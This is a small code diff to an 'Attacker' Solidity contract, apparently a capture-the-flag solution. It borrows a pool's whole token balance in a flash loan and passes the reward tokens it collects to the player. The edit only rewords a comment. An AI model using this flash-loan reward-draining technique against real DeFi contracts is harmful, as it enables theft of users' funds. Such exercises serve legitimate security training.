@@ -35,7 +35,7 @@ contract Attacker {
     // the flow continues at receiveFlashLoan()
     flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
 
-    // give the funds to beat the level
+    // give the reward to the player, to beat the level
     rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
   }
 
